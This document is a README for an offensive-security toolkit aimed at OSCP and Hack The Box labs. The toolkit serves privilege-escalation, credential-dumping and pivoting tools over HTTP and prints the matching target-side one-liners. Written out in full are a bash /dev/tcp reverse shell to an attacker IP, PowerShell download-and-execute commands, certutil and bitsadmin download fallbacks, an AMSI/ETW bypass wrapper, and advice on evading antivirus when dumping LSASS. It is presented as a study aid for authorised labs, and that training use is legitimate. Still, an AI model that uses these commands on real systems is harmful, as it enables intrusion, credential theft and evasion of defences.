# 🗡️ OSCP Arsenal

> A self-contained, kill-chain-organized offensive toolkit that you serve over HTTP from your attacker box (Kali) so target machines can pull tools in with a single one-liner.

Built specifically for **OSCP / OSEP / HTB / lab environments** where you repeatedly need to land `linpeas`, `winPEAS`, `PowerView`, `chisel`, `mimikatz`, etc. on a foothold. Instead of typing or googling the right `wget` / `iwr` / `certutil` syntax for every tool, **`./serve.sh`** prints them all for you, ready to copy-paste.

```
┌──(kali㉿attacker)─[~/oscp-arsenal]
└─$ ./serve.sh
==============================================================
   OSCP ARSENAL  -  serving /home/kali/oscp-arsenal/tools
==============================================================
IP   : 10.10.14.42
PORT : 8000
URL  : http://10.10.14.42:8000/

--- [1] LISTENER  (Kali - waiting for shell) ---
nc          rlwrap nc -lvnp 4444
pwncat      pwncat-cs -lp 4444
msf         msfconsole -q -x 'use exploit/multi/handler; ...'

--- [2] REVERSE SHELL  (run on target, LHOST=10.10.14.42 LPORT=4444) ---
bash        bash -c 'bash -i >& /dev/tcp/10.10.14.42/4444 0>&1'
python3     python3 -c 'import socket,os,pty;s=socket.socket();...'
ps-tcp      iex (iwr http://10.10.14.42:8000/revshells/Invoke-PowerShellTcp.ps1 -UB).Content; ...

[...sections continue: Linux/Windows enum, AD recon/attack/dump, transfer, pivot, fallbacks...]

Serving HTTP on 0.0.0.0 port 8000 ...
10.10.11.50 - - [07/May/2026 14:23:11] "GET /linux/linpeas.sh HTTP/1.1" 200 -
```

---

## ✨ What's inside

The toolkit is organized by **kill-chain phase**, not by alphabet. Each tool has 1–3 delivery variants (in-memory, on-disk, certutil fallback) so when AV blocks one you swap to the next.

### 🐧 Linux

`linpeas` · `linpeas_small` · `pspy64` · `pspy32` · `lse.sh` · `linux-exploit-suggester` · `les2.pl` · `lazagne` · `socat`

### 🪟 Windows enum & privesc

`winPEAS` (x64/x86/bat/ps1) · `PrivescCheck` · `PowerUp` · `Sherlock` · `Watson` · `JAWS` · `Seatbelt` · `accesschk`

### 🥔 Token abuse (SeImpersonate)

`PrintSpoofer` (32/64) · `GodPotato` (NET4/NET35) · `JuicyPotato` · `JuicyPotatoNG`

### 🏰 Active Directory

`PowerView` · `SharpHound` (ps1+exe) · `Rubeus` · `Certify` · `SafetyKatz` · `mimikatz` · `kerbrute` (linux+windows) · `PetitPotam` · `adPEAS` · `enum4linux-ng` · `Invoke-Mimikatz` · `Invoke-Kerberoast`

### 🔑 Credential dumping

`mimikatz` · `SafetyKatz` · `LaZagne` (windows+linux) · `secretsdump` (impacket reference)

### 📡 Transfer & shells

`nc.exe` (32/64) · `plink.exe` · `socat` · `powercat.ps1` · `Invoke-PowerShellTcp.ps1` · `php-reverse-shell.php` · `cmd.jsp` · `cmdasp.aspx`

### 🔀 Pivot / Tunnel

`chisel` (linux+windows, extracted binaries) · `ligolo-ng` (proxy + agent for linux+windows, extracted)

### 📚 Wordlists

`rockyou.txt` symlink (if `wordlists` package is installed)

---

## 🚀 Quick start

```bash
# 1. Clone on your Kali box
git clone https://github.com/kocaemre/oscp-arsenal.git ~/oscp-arsenal
cd ~/oscp-arsenal
chmod +x *.sh

# 2. Populate tools/ (copies from Kali's local paths if available, else fetches latest from GitHub)
./build_arsenal.sh

# 3. Start the HTTP server (auto-detects tun0 IP, prints all download oneliners)
./serve.sh
```

That's it. Now in another shell:

```bash
# Listener
rlwrap nc -lvnp 4444

# Need help with a specific tool?
./payloads.sh winpeas

# Defender blocking your PowerShell?
./amsi_b64.sh "iex (iwr http://10.10.14.42:8000/windows/PowerUp.ps1 -UB).Content; Invoke-AllChecks"

# Need a custom msfvenom payload?
./msfgen.sh windows 4444   # → tools/payloads/win-rev-4444.exe
```

---

## 🧰 Scripts

| Script | What it does |
|---|---|
| `build_arsenal.sh` | Populates `tools/`. Prefers Kali's `/usr/share/peass`, `/usr/bin/pspy64`, `/usr/share/windows-resources/binaries/`, etc. Falls back to GitHub releases. **Idempotent** — re-run to fill missing files. |
| `setup_light.sh` | Lightweight, portable variant of `build_arsenal.sh`. Drops ~20 core tools into a flat `~/Desktop/ctf-tools/` directory and writes its own `serve.sh` next to them. Single self-contained file you can copy to any Kali box. See [Light variant](#-light-variant) below. |
| `serve.sh` | Auto-detects `tun0` IP, prints the compact cheatsheet, then `python3 -m http.server`. Default port `8000`, pass another port as arg (`./serve.sh 80`). Use `--no-banner` to skip the cheatsheet. |
| `payloads.sh` | Generates copy-paste oneliners. `--compact` gives the kill-chain table. Filter with `./payloads.sh winpeas` for a single tool with all delivery variants. |
| `update.sh` | Backs up current `tools/` and re-runs `build_arsenal.sh` to fetch the latest versions. Run it before exam day. |
| `aliases.sh` | `source` it to enable shortcuts: `myip`, `arsenal-serve`, `revshell <ip> <port>`, `nc4444`, `smb-share`, `lpeas`, `wpeas`. |
| `msfgen.sh` | `msfvenom` wrapper. Auto-detects `tun0` IP. Targets: `windows`, `linux`, `ps1`, `php`, `aspx`, `war`, `all`. |
| `amsi_b64.sh` | Wraps a PowerShell command with an AMSI + ETW bypass and base64-encodes the whole thing for `powershell -ep bypass -e <B64>`. Has shortcuts: `-winpeas`, `-revshell <port>`. |

---

## 🪶 Light variant

For situations where you want a minimal, portable toolkit (USB stick, fresh VM, throwaway box) without the full `tools/` tree:

```bash
chmod +x setup_light.sh
./setup_light.sh
```

This installs ~20 core tools into a flat `~/Desktop/ctf-tools/` directory and generates a self-contained `serve.sh` next to them:

```bash
~/Desktop/ctf-tools/serve.sh           # default port 8000
~/Desktop/ctf-tools/serve.sh 80        # custom port
```

### Included

| Category | Tools |
|---|---|
| Linux enum / privesc | `linpeas.sh`, `pspy64`, `linux-exploit-suggester.sh` |
| Windows enum / privesc | `winPEASx64.exe`, `winPEAS.bat`, `PowerUp.ps1`, `PrivescCheck.ps1` |
| Token abuse | `SigmaPotato.exe` (covers JuicyPotato / PrintSpoofer / GodPotato use cases) |
| Active Directory | `PowerView.ps1`, `SharpHound.ps1`, `SharpHound.exe`, `kerbrute` (linux+win) |
| Credential dumping | `mimikatz.exe`, `LaZagne.exe` |
| Transfer / shells | `nc.exe`, `powercat.ps1` |
| Pivot / tunnel | `chisel` (linux+win), `ligolo-ng` proxy + agent (linux+win) |

### Apt package check

The script also verifies that common Kali packages are installed (`responder`, `bloodhound`, `evil-winrm`, `crackmapexec`, `impacket`, `hashcat`, `john`, `hydra`, `sqlmap`, `gobuster`, `socat`, `proxychains4`, `sshuttle`, `enum4linux-ng`, ...) and prints a single `apt install` line for anything missing.

### Full vs Light

| | Full (`build_arsenal.sh`) | Light (`setup_light.sh`) |
|---|---|---|
| Tools | 40+ | ~20 |
| Layout | `tools/{linux,windows,ad,transfer,...}/` | flat `~/Desktop/ctf-tools/` |
| Install target | repo dir | `$HOME/Desktop/ctf-tools/` |
| Helpers | `payloads.sh`, `msfgen.sh`, `amsi_b64.sh`, aliases | just `serve.sh` |
| Use case | exam / lab daily driver | quick setup on a fresh box |

---

## 📂 Directory layout

```
oscp-arsenal/
├── build_arsenal.sh
├── serve.sh
├── payloads.sh
├── update.sh
├── aliases.sh
├── msfgen.sh
├── amsi_b64.sh
├── README.md
├── .gitignore                  # tools/ is git-ignored (binaries are fetched, not committed)
└── tools/                      # generated by build_arsenal.sh
    ├── linux/                  # linpeas, pspy, lse, exploit-suggester, lazagne
    ├── windows/                # winPEAS, PrivescCheck, PowerUp, Sherlock, Watson,
    │                           # JAWS, Seatbelt, accesschk, JuicyPotato(NG),
    │                           # PrintSpoofer, GodPotato
    ├── transfer/               # nc.exe, plink, socat, chisel, ligolo-ng (extracted)
    ├── ad/                     # PowerView, SharpHound, Rubeus, Certify, SafetyKatz,
    │                           # mimikatz, kerbrute, PetitPotam, LaZagne
    ├── enum/                   # enum4linux-ng, adPEAS
    ├── revshells/              # powercat, Invoke-PowerShellTcp, php/jsp/aspx
    ├── wordlists/              # rockyou symlink
    └── payloads/               # generated by msfgen.sh
```

---

## 💡 Real exam workflow

```bash
# Terminal 1 — server stays open all day
./serve.sh

# Terminal 2 — listener
rlwrap nc -lvnp 4444

# Terminal 3 — find an RCE / upload a webshell, then grab a reverse shell
# (just copy the line from `[2] REVERSE SHELL` section that the server printed)

# After landing initial foothold on Linux target:
wget http://10.10.14.42:8000/linux/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh

# After landing on Windows target:
iwr http://10.10.14.42:8000/windows/winPEASx64.exe -o $env:TEMP\wp.exe; & $env:TEMP\wp.exe

# AV blocks the above? Drop down a layer:
./amsi_b64.sh "iex (iwr http://10.10.14.42:8000/windows/PowerUp.ps1 -UB).Content; Invoke-AllChecks"
# paste the printed `powershell -ep bypass -e <B64>` on target

# In an AD environment? After domain creds:
./payloads.sh sharphound      # for collector commands
./payloads.sh rubeus          # for kerberoast / asreproast

# Web shell on IIS with SeImpersonate? Token abuse:
iwr http://10.10.14.42:8000/windows/PrintSpoofer64.exe -o $env:TEMP\ps.exe; & $env:TEMP\ps.exe -i -c cmd

# Need to pivot into a second subnet?
./payloads.sh chisel          # or ligolo
```

---

## 🩹 Fallback patterns (when things break)

| Symptom | Switch to |
|---|---|
| `iwr -OutFile` blocked / file dropped & deleted | `iex (iwr URL -UB).Content` (in-memory) |
| `iex` blocked by AMSI | `./amsi_b64.sh "iex (iwr URL -UB).Content"` (bypass + base64) |
| PowerShell missing / Constrained Language Mode | `certutil -urlcache -split -f URL out.exe` |
| `certutil` removed | `bitsadmin /transfer N URL out.exe` (works on older Windows) |
| Execution policy restricted | `powershell -ep bypass -f file.ps1` |
| `.ps1` won't run no matter what | Use the `.exe` versions (Rubeus, Seatbelt, SharpHound have them) |

The `[F] FALLBACK PATTERNS` section at the bottom of `serve.sh`/`payloads.sh --compact` summarizes these inline.

---

## 🛠 Customization

### Change the listening port

```bash
./serve.sh 80         # standard, blends in (needs sudo)
./serve.sh 8080       # also common
```

### Generate payloads on the fly

```bash
./msfgen.sh windows 4444             # → tools/payloads/win-rev-4444.exe
./msfgen.sh linux 9001               # → tools/payloads/lin-rev-9001.elf
./msfgen.sh all 4444                 # all formats at once
./msfgen.sh -i 192.168.45.5 ps1 443  # custom IP + format + port
```

### Persistent shell aliases

```bash
echo "source ~/oscp-arsenal/aliases.sh" >> ~/.zshrc   # or ~/.bashrc
source ~/.zshrc

# Now you can:
revshell 10.10.14.42 4444    # prints bash/python3/powershell oneliners
arsenal-serve                # serve on port 80
smb-share                    # impacket-smbserver of tools/
myip                         # print tun0 IP
```

### Update before exam day

```bash
./update.sh
# Backs up tools/ to tools.old.<ts>/ and re-runs build to fetch latest
# (linpeas/winPEAS update frequently — pull a fresh copy)
```

---

## 📋 Requirements

- **Kali Linux** (or any Debian-based distro). Other distros work but `build_arsenal.sh` won't find local copies and will fetch everything from GitHub.
- `bash`, `curl` or `wget`, `python3`, `tar`, `unzip`, `gzip`
- `iconv` + `base64` (for `amsi_b64.sh`)
- `msfvenom` (for `msfgen.sh`, optional)
- `impacket-smbserver` (for the `smb-share` alias, optional)
- `rlwrap` (for nicer listener experience, optional)

---

## ⚠️ Notes

- **`tools/` is git-ignored.** Binaries are 200–400 MB total; they're fetched on demand. Keeps the repo clone small.
- **No 0days or custom exploits here.** Just convenient packaging of well-known public tools.
- **Use only on systems you have permission to test.** This is a study aid for OSCP / HTB / your own lab.
- **PowerSploit is archived.** PowerView/PowerUp still work, but the upstream repo is read-only. Considered acceptable for OSCP; modern engagements use BloodHound + Rubeus + custom tooling.
- **mimikatz triggers Defender instantly.** Use `SafetyKatz`, `Invoke-Mimikatz` with AMSI bypass, or dump LSASS offline with `comsvcs.dll` and process the dump on Kali.

---

## 🔗 Credits

Tools pulled from their respective authors:

- [carlospolop/PEASS-ng](https://github.com/peass-ng/PEASS-ng)
- [DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
- [diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- [PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (archived, includes PowerView + PowerUp)
- [itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck) · [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [ohpe/juicy-potato](https://github.com/ohpe/juicy-potato) · [antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
- [BloodHoundAD/SharpHound](https://github.com/BloodHoundAD/SharpHound) · [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
- [ropnop/kerbrute](https://github.com/ropnop/kerbrute)
- [topotam/PetitPotam](https://github.com/topotam/PetitPotam)
- [AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)
- [jpillora/chisel](https://github.com/jpillora/chisel) · [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
- [besimorhino/powercat](https://github.com/besimorhino/powercat) · [samratashok/nishang](https://github.com/samratashok/nishang)
- [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
- [411Hall/JAWS](https://github.com/411Hall/JAWS) · [rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock) · [rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)
- [r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) (Seatbelt, Rubeus, Certify, SafetyKatz)
- [61106960/adPEAS](https://github.com/61106960/adPEAS)
- [cddmp/enum4linux-ng](https://github.com/cddmp/enum4linux-ng)

---

## 📜 License

MIT — do whatever you want, but don't blame me when an exam proctor asks why you have `mimikatz_trunk.zip` in your home directory.

> *"The only easy day was yesterday."*
